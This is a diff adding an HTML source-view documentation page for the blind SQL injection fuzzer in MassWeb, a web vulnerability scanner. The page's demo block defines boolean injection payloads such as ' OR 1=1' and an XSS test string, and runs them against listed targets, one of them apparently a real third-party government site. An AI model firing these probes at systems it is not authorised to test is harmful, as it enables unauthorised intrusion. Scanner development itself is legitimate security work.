+            <span class="k">if</span> <span class="bp">self</span><span class="o">.</span><span class="n">hadoop_reporting</span><span class="p">:</span>
+                <span class="n">logger</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">&quot;Found a Blind SQL result with true response content of </span><span class="si">%s</span><span class="s"> and false of </span><span class="si">%s</span><span class="s">&quot;</span> <span class="o">%</span> <span class="p">(</span><span class="n">true_content_length</span><span class="p">,</span> <span class="n">false_content_length</span><span class="p">))</span>
+            <span class="k">return</span> <span class="bp">True</span>
+        <span class="k">else</span><span class="p">:</span>
+            <span class="k">if</span> <span class="bp">self</span><span class="o">.</span><span class="n">hadoop_reporting</span><span class="p">:</span>
+                <span class="n">logger</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">&quot;No Blind SQL with true response content of </span><span class="si">%s</span><span class="s"> and false of </span><span class="si">%s</span><span class="s">&quot;</span> <span class="o">%</span> <span class="p">(</span><span class="n">true_content_length</span><span class="p">,</span> <span class="n">false_content_length</span><span class="p">))</span>
+            <span class="k">return</span> <span class="bp">False</span>
+</div>
+<div class="viewcode-block" id="BSQLiFuzzer.fuzz"><a class="viewcode-back" href="../../../massweb.fuzzers.html#massweb.fuzzers.bsqli_fuzzer.BSQLiFuzzer.fuzz">[docs]</a>    <span class="k">def</span> <span class="nf">fuzz</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+
+        <span class="bp">self</span><span class="o">.</span><span class="n">__build_fuzzy_target_groups</span><span class="p">()</span>
+        <span class="n">fuzzy_target_groups</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">__build_fuzzy_target_groups</span><span class="p">()</span>
+
+        <span class="n">results</span> <span class="o">=</span> <span class="p">[]</span>
+        <span class="k">for</span> <span class="n">ftg</span> <span class="ow">in</span> <span class="n">fuzzy_target_groups</span><span class="p">:</span>
+            <span class="n">result_dic</span> <span class="o">=</span> <span class="p">{}</span>
+<span class="c">#            for fuzzy_target in ftg.fuzzy_targets:</span>
+<span class="c">#                print &quot;================================================&quot;</span>
+<span class="c">#                print fuzzy_target.url</span>
+<span class="c">#                print fuzzy_target.ttype</span>
+<span class="c">#                print fuzzy_target.data</span>
+<span class="c">#                print fuzzy_target.payload</span>
+<span class="c">#                print fuzzy_target.unfuzzed_data</span>
+<span class="c">#                print fuzzy_target.unfuzzed_url</span>
+<span class="c">#                print fuzzy_target.payload.payload_attributes</span>
+<span class="c">#                print &quot;================================================&quot;</span>
+            <span class="k">try</span><span class="p">:</span>
+                <span class="k">if</span> <span class="n">ftg</span><span class="o">.</span><span class="n">fuzzy_targets</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">unfuzzed_target</span> <span class="ow">in</span> <span class="bp">self</span><span class="o">.</span><span class="n">unstable_targets</span><span class="p">:</span>
+                    <span class="n">logger</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">u&quot;Target </span><span class="si">%s</span><span class="s"> is unstable so marking bsqli result as false&quot;</span> <span class="o">%</span> <span class="nb">unicode</span><span class="p">(</span><span class="n">ftg</span><span class="o">.</span><span class="n">fuzzy_targets</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">unfuzzed_target</span><span class="p">))</span>
+                    <span class="n">result_dic</span><span class="p">[</span><span class="s">&quot;bsqli&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="bp">False</span>
+                
+                <span class="k">else</span><span class="p">:</span>
+                    <span class="c">#!bsqli check here</span>
+                    <span class="n">result_dic</span><span class="p">[</span><span class="s">&quot;bsqli&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">check_for_bsqli</span><span class="p">(</span><span class="n">ftg</span><span class="p">)</span>
+
+            <span class="k">except</span><span class="p">:</span>
+                <span class="k">if</span> <span class="bp">self</span><span class="o">.</span><span class="n">hadoop_reporting</span><span class="p">:</span>
+                    <span class="n">logger</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">u&quot;Caught exception trying to perform BSQLi check on </span><span class="si">%s</span><span class="s"> :&quot;</span>  <span class="o">%</span> <span class="nb">unicode</span><span class="p">(</span><span class="n">ftg</span><span class="o">.</span><span class="n">fuzzy_targets</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">unfuzzed_target</span><span class="p">))</span>
+                    <span class="n">traceback</span><span class="o">.</span><span class="n">print_exc</span><span class="p">()</span>
+                    <span class="n">result_dic</span><span class="p">[</span><span class="s">&quot;bsqli&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="bp">False</span>
+
+            <span class="n">results</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">Result</span><span class="p">(</span><span class="n">ftg</span><span class="o">.</span><span class="n">fuzzy_targets</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="n">result_dic</span><span class="p">))</span>
+            
+        <span class="k">return</span> <span class="n">results</span>
+</div></div>
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">&quot;__main__&quot;</span><span class="p">:</span>
+
+    <span class="n">target</span> <span class="o">=</span> <span class="n">Target</span><span class="p">(</span><span class="s">u&quot;http://www.hyperiongray.com/?q=333&amp;q2=v2&quot;</span><span class="p">)</span>
+    <span class="n">target2</span> <span class="o">=</span> <span class="n">Target</span><span class="p">(</span><span class="s">u&quot;http://prisons.ir/index.php?Module=SMMNewsAgency&amp;SMMOp=View&amp;SMM_CMD=&amp;PageId=6935&quot;</span><span class="p">,</span> <span class="n">ttype</span> <span class="o">=</span> <span class="s">&quot;get&quot;</span><span class="p">)</span>
+    <span class="n">target3</span> <span class="o">=</span> <span class="n">Target</span><span class="p">(</span><span class="s">u&quot;http://course.hyperiongray.com/vuln2/898538a7335fd8e6bac310f079ba3fd1/?dd=%3Cscript</span><span class="si">%3E</span><span class="s">alert</span><span class="si">%2833%</span><span class="s">29%3C/script</span><span class="si">%3E</span><span class="s">&quot;</span><span class="p">)</span>
+    <span class="n">target4</span> <span class="o">=</span> <span class="n">Target</span><span class="p">(</span><span class="s">u&quot;http://course.hyperiongray.com/bsqli-example/?q=44&quot;</span><span class="p">,</span> <span class="n">ttype</span> <span class="o">=</span> <span class="s">&quot;get&quot;</span><span class="p">)</span>
+    
+    <span class="n">generic_true_payload</span> <span class="o">=</span>  <span class="n">BSQLIPayload</span><span class="p">(</span><span class="s">&quot; AND 1=1&quot;</span><span class="p">,</span> <span class="p">{</span><span class="s">&quot;truth&quot;</span> <span class="p">:</span> <span class="bp">True</span><span class="p">})</span>
+    <span class="n">generic_false_payload</span> <span class="o">=</span>  <span class="n">BSQLIPayload</span><span class="p">(</span><span class="s">&quot; AND 1=2&quot;</span><span class="p">,</span> <span class="p">{</span><span class="s">&quot;truth&quot;</span> <span class="p">:</span> <span class="bp">False</span><span class="p">})</span>
+    <span class="n">generic_payload_group</span> <span class="o">=</span> <span class="n">BSQLIPayloadGroup</span><span class="p">(</span><span class="n">generic_true_payload</span><span class="p">,</span> <span class="n">generic_false_payload</span><span class="p">)</span>
+
+    <span class="n">dump_true_payload</span> <span class="o">=</span>  <span class="n">BSQLIPayload</span><span class="p">(</span><span class="s">&quot; OR 1=1&quot;</span><span class="p">,</span> <span class="p">{</span><span class="s">&quot;truth&quot;</span> <span class="p">:</span> <span class="bp">True</span><span class="p">})</span>
+    <span class="n">dump_false_payload</span> <span class="o">=</span>  <span class="n">BSQLIPayload</span><span class="p">(</span><span class="s">&quot; OR 1=2&quot;</span><span class="p">,</span> <span class="p">{</span><span class="s">&quot;truth&quot;</span> <span class="p">:</span> <span class="bp">False</span><span class="p">})</span>
+    <span class="n">dump_payload_group</span> <span class="o">=</span> <span class="n">BSQLIPayloadGroup</span><span class="p">(</span><span class="n">dump_true_payload</span><span class="p">,</span> <span class="n">dump_false_payload</span><span class="p">)</span>
+        
+    <span class="n">payload_groups</span> <span class="o">=</span> <span class="p">[</span><span class="n">generic_payload_group</span><span class="p">,</span> <span class="n">dump_payload_group</span><span class="p">]</span>
+
+    <span class="n">bf</span> <span class="o">=</span> <span class="n">BSQLiFuzzer</span><span class="p">([</span><span class="n">target</span><span class="p">,</span> <span class="n">target2</span><span class="p">,</span> <span class="n">target3</span><span class="p">,</span> <span class="n">target4</span><span class="p">],</span> <span class="n">bsqli_payload_groups</span> <span class="o">=</span> <span class="n">payload_groups</span><span class="p">,</span> <span class="n">hadoop_reporting</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span> <span class="n">num_threads</span> <span class="o">=</span> <span class="mi">5</span><span class="p">)</span>
+    <span class="k">for</span> <span class="n">result</span> <span class="ow">in</span> <span class="n">bf</span><span class="o">.</span><span class="n">fuzz</span><span class="p">():</span>
+        <span class="k">print</span> <span class="n">result</span>
+</pre></div>
+
+          </div>
+        </div>
+      </div>
+      <div class="sphinxsidebar">
+        <div class="sphinxsidebarwrapper">
+<h1 class="logo"><a href="../../../index.html">MassWeb</a></h1>
+
+
+
+
+
+
+<h3>Navigation</h3>
+<ul>
+<li class="toctree-l1"><a class="reference internal" href="../../../_static/intro.html">Intro</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../../_static/install.html">Installation</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../../_static/features.html">Features</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../../_static/usage.html">Usage</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../../massweb.html">massweb</a></li>
+</ul>
+
+
+<div id="searchbox" style="display: none">
+  <h3>Quick search</h3>
+    <form class="search" action="../../../search.html" method="get">
+      <input type="text" name="q" />
+      <input type="submit" value="Go" />
+      <input type="hidden" name="check_keywords" value="yes" />
+      <input type="hidden" name="area" value="default" />
+    </form>
+    <p class="searchtip" style="font-size: 90%">
+    Enter search terms or a module, class or function name.
+    </p>
+</div>
+<script type="text/javascript">$('#searchbox').show(0);</script>
+        </div>
+      </div>
+      <div class="clearer"></div>
+    </div>
+    <div class="footer">
+      &copy;2015, Alejandro Caceres, Chris Koepke.
+      
+      |
+      Powered by <a href="http://sphinx-doc.org/">Sphinx 1.2.3</a>
+      &amp; <a href="https://github.com/bitprophet/alabaster">Alabaster 0.6.3</a>
+      
+    </div>
+
+    
+
+    
+  </body>
+</html>
